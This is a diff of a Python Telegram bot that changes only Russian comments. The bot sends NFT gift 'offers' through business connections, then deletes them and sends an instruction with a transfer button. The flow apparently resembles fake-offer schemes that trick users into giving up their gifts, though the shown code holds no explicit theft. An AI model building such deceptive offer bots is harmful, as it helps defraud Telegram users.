@@ -12,10 +12,10 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=TOKEN)
 dp = Dispatcher(storage=MemoryStorage())
 
-# Очередь для отправки новых сообщений с защитой от флуда
+# Очередь для отправки сообщений с защитой от флуда
 message_queue = asyncio.Queue()
 
-# Текст оффера (с превью карточки сверху)
+# Текст оффера (с превью карточки сверху для любого NFT)
 def build_offer_text(sender_username, amount, gift_name, gift_num):
     slug = gift_name.replace(" ", "")
     return (
@@ -83,13 +83,13 @@ async def accept_offer(cb: CallbackQuery):
     chat_id = cb.message.chat.id
 
     try:
-        # 1. Сначала полностью удаляем сообщение с оффером
+        # 1. Удаляем старое сообщение с оффером
         await bot.delete_business_messages(
             business_connection_id=bcid,
             message_ids=[cb.message.message_id]
         )
         
-        # 2. Отправляем абсолютно новое сообщение с инструкцией и кнопками передачи
+        # 2. Присылаем новое сообщение с инструкцией и кнопкой передачи
         await bot.send_message(
             chat_id=chat_id,
             text=text,
@@ -107,7 +107,6 @@ async def accept_offer(cb: CallbackQuery):
 @dp.callback_query(F.data.startswith("d|"))
 async def decline_offer(cb: CallbackQuery):
     try:
-        # При отклонении тоже можем просто удалить сообщение с оффером
         await bot.delete_business_messages(
             business_connection_id=cb.message.business_connection_id,
             message_ids=[cb.message.message_id]
@@ -120,7 +119,7 @@ async def decline_offer(cb: CallbackQuery):
 async def noop_handler(cb: CallbackQuery):
     await cb.answer("Выполните передачу по кнопке выше", show_alert=False)
 
-# Фоновый воркер для отправки новых офферов через очередь
+# Фоновый воркер для безопасной отправки офферов
 async def sender_worker():
     while True:
         task = await message_queue.get()
